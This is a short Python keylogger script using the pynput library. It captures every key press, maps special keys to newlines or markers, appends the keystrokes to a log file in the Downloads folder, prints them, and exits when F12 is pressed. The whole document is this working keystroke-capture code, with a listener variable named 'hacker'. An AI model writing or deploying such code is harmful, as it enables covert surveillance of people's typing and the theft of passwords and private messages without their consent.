from pynput.keyboard import Listener

def anonymous(key):
	key = str(key)
	key = key.replace("'","")
	if(key == "Key.f12"):
		raise SystemExit(0)
	if key == "Key.ctrl_l":
		key = "\n"
	if key == "Key.enter":
		key = "\n" 
	if key == "Key.alt_t":
		key = "\n"
	if key == "Key.tab":
		key = "\n"
	if key == "Key.backspace":
		key = " [BACKSPACE] "
	if key == "Key.space":
		key = " "
	if key == "Key.caps_lock":
		key = "\n[Caps Lock]\n"
	if key == "Key.shift" or key == "Key.shift_r":
		key = ""
	with open(".\\Downloads\\log.txt","a") as file:
		file.write(key)
	print(key)

with Listener(on_press=anonymous) as hacker:
	hacker.join()
a